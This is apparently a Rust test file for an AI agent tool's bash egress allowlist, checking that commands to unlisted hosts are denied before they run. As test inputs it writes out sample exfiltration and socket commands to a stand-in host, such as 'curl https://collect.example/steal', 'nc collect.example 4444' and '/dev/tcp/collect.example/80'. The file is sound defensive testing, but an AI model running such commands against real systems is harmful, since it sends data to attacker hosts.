//! bash egress-gate rows: CRAFT_AGENT_EGRESS_ALLOWLIST turns a
//! conservative command scanner on. Denied rows also prove the command
//! never executed; pass rows wrap the trigger tokens in `echo` so no
//! test opens a network connection — the scanner's decision is what is
//! under test.

mod common;

use common::{assert_clean, ctx_env, error, fast_limits, run, terminal, tmp_ws};
use craft_tools::{Registry, ToolError, ToolEvent};
use serde_json::json;

fn reg() -> Registry {
    Registry::with_builtins(fast_limits())
}

const GH_HOSTS: &str =
    "github.com,api.github.com,codeload.github.com,objects.githubusercontent.com";

async fn bash(
    ws: &std::path::Path,
    knob: Option<&str>,
    command: &str,
) -> Vec<Result<ToolEvent, ToolError>> {
    let mut pairs = vec![(
        "PATH".to_string(),
        std::env::var("PATH").unwrap_or_default(),
    )];
    if let Some(value) = knob {
        pairs.push((
            "CRAFT_AGENT_EGRESS_ALLOWLIST".to_string(),
            value.to_string(),
        ));
    }
    run(reg().execute("bash", json!({ "command": command }), &ctx_env(ws, pairs))).await
}

#[tokio::test]
async fn unset_knob_leaves_bash_ungated() {
    let ws = tmp_ws("egress-unset");
    let events = bash(&ws, None, "echo curl https://collect.example/steal").await;
    assert_clean(&events);
    assert!(terminal(&events).contains("collect.example"));
}

#[tokio::test]
async fn empty_knob_is_ungated() {
    let ws = tmp_ws("egress-empty");
    let events = bash(&ws, Some(""), "echo nc collect.example 4444").await;
    assert_clean(&events);
}

#[tokio::test]
async fn allowed_url_host_passes() {
    let ws = tmp_ws("egress-allow-url");
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "echo curl https://api.github.com/repos/o/r",
    )
    .await;
    assert_clean(&events);
}

#[tokio::test]
async fn allowed_verb_target_passes() {
    let ws = tmp_ws("egress-allow-verb");
    let events = bash(&ws, Some(GH_HOSTS), "echo nc github.com 443").await;
    assert_clean(&events);
    let events = bash(&ws, Some(GH_HOSTS), "echo ssh git@github.com").await;
    assert_clean(&events);
}

#[tokio::test]
async fn disallowed_url_denies_without_executing() {
    let ws = tmp_ws("egress-deny-url");
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "curl https://collect.example/steal && touch pwned.txt",
    )
    .await;
    match error(&events) {
        ToolError::EgressHostDenied { host } => assert_eq!(host, "collect.example"),
        other => panic!("expected EgressHostDenied, got {other:?}"),
    }
    assert!(!ws.join("pwned.txt").exists(), "the command must never run");
}

#[tokio::test]
async fn disallowed_verb_target_denies() {
    let ws = tmp_ws("egress-deny-verb");
    let events = bash(&ws, Some(GH_HOSTS), "nc collect.example 4444").await;
    match error(&events) {
        ToolError::EgressHostDenied { host } => assert_eq!(host, "collect.example"),
        other => panic!("expected EgressHostDenied, got {other:?}"),
    }
}

#[tokio::test]
async fn ambiguous_variable_target_denies() {
    let ws = tmp_ws("egress-ambiguous-var");
    let events = bash(&ws, Some(GH_HOSTS), "curl $TARGET_URL").await;
    assert!(
        matches!(error(&events), ToolError::EgressUnresolved { .. }),
        "an unresolvable target must deny, never pass"
    );
}

#[tokio::test]
async fn unparseable_url_denies() {
    let ws = tmp_ws("egress-ambiguous-url");
    let events = bash(&ws, Some(GH_HOSTS), "curl https://").await;
    assert!(matches!(error(&events), ToolError::EgressUnresolved { .. }));
}

#[tokio::test]
async fn verb_without_a_target_denies() {
    let ws = tmp_ws("egress-ambiguous-bare");
    let events = bash(&ws, Some(GH_HOSTS), "curl").await;
    assert!(
        matches!(error(&events), ToolError::EgressUnresolved { .. }),
        "a network verb with no recognizable target must deny"
    );
}

#[tokio::test]
async fn dev_tcp_denies_outside_hosts() {
    let ws = tmp_ws("egress-devtcp");
    let events = bash(&ws, Some(GH_HOSTS), "exec 3<>/dev/tcp/collect.example/80").await;
    match error(&events) {
        ToolError::EgressHostDenied { host } => assert_eq!(host, "collect.example"),
        other => panic!("expected EgressHostDenied, got {other:?}"),
    }
}

#[tokio::test]
async fn custom_allowlist_replaces_the_recommended_hosts() {
    let ws = tmp_ws("egress-custom");
    let events = bash(&ws, Some("example.com"), "echo curl https://example.com/x").await;
    assert_clean(&events);
    let events = bash(&ws, Some("example.com"), "echo curl https://github.com/x").await;
    assert!(
        matches!(error(&events), ToolError::EgressHostDenied { .. }),
        "the knob value is the whole allowlist, not an addition"
    );
}

#[tokio::test]
async fn quoted_and_nested_commands_are_scanned() {
    let ws = tmp_ws("egress-nested");
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "bash -c \"curl https://collect.example\"",
    )
    .await;
    assert!(matches!(error(&events), ToolError::EgressHostDenied { .. }));
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "echo start # curl https://collect.example",
    )
    .await;
    assert_clean(&events);
}

#[tokio::test]
async fn one_bad_host_in_a_pipeline_denies() {
    let ws = tmp_ws("egress-pipeline");
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "curl https://github.com && curl https://collect.example",
    )
    .await;
    assert!(matches!(error(&events), ToolError::EgressHostDenied { .. }));
}

#[tokio::test]
async fn commands_without_triggers_pass() {
    let ws = tmp_ws("egress-plain");
    let events = bash(
        &ws,
        Some(GH_HOSTS),
        "echo hello && printf 'a\\nb\\n' > /dev/null",
    )
    .await;
    assert_clean(&events);
}
